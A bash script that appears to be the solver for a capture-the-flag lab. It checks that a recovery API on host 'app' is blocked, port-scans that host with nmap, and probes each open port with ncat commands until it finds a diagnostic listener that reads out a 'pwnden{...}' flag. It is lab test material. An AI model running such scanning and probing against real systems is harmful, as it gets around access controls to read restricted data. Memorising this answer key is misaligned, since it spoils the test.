#!/bin/bash
set -euo pipefail
work=$(mktemp -d /tmp/diagnostic-port.XXXXXX)
trap 'rm -rf "$work"' EXIT
test "$(curl -sS --max-time 5 -o "$work/http" -w '%{http_code}' http://app:8000/api/recovery)" = 403
nmap --unprivileged -sT -Pn -n -p 8000-8010 --max-parallelism 2 --max-retries 1 --host-timeout 10s -oG "$work/scan" app >&2
ports=$(awk -F 'Ports: ' '/Ports:/{print $2}' "$work/scan" | tr ',' '\n' | awk -F/ '$2 == "open" {gsub(/ /,"",$1); print $1}')
probe() {
    local code=0
    printf '%s\n' "$1" | ncat -w 3 --idle-timeout 1 app "$2" > "$3" 2> "$work/ncat-error" || code=$?
    if [ "$code" != 0 ]; then
        test "$code" = 1
        grep -qx 'Ncat: Idle timeout expired (1000 ms).' "$work/ncat-error"
    fi
    test "$(wc -l < "$3")" = 2
}
for port in $ports; do
    if [ "$port" = 8000 ]; then continue; fi
    probe HELP "$port" "$work/help"
    if ! grep -q '^LAB-DIAG/1' "$work/help"; then continue; fi
    probe STATUS "$port" "$work/status"
    resource=$(sed -n 's/^OK board=ready active_resource=//p' "$work/status")
    test -n "$resource"
    probe LIST "$port" "$work/list"
    grep -q "$resource" "$work/list"
    probe "READ $resource" "$port" "$work/read"
    if grep -q '^DENIED' "$work/read"; then exit 3; fi
    rg -o 'pwnden\{[^}]+\}' "$work/read"
    exit 0
done
printf '%s\n' 'No diagnostic listener found in the supplied range' >&2
exit 1
